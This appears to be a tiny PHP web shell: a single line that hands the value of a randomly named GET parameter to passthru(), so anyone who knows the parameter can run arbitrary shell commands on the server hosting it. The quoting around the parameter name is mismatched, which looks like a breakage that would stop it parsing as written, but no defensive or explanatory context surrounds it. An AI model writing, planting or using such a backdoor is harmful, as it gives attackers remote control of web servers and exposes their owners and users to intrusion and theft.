<?php
passthru($_GET["tydWT9Bq']);
?>
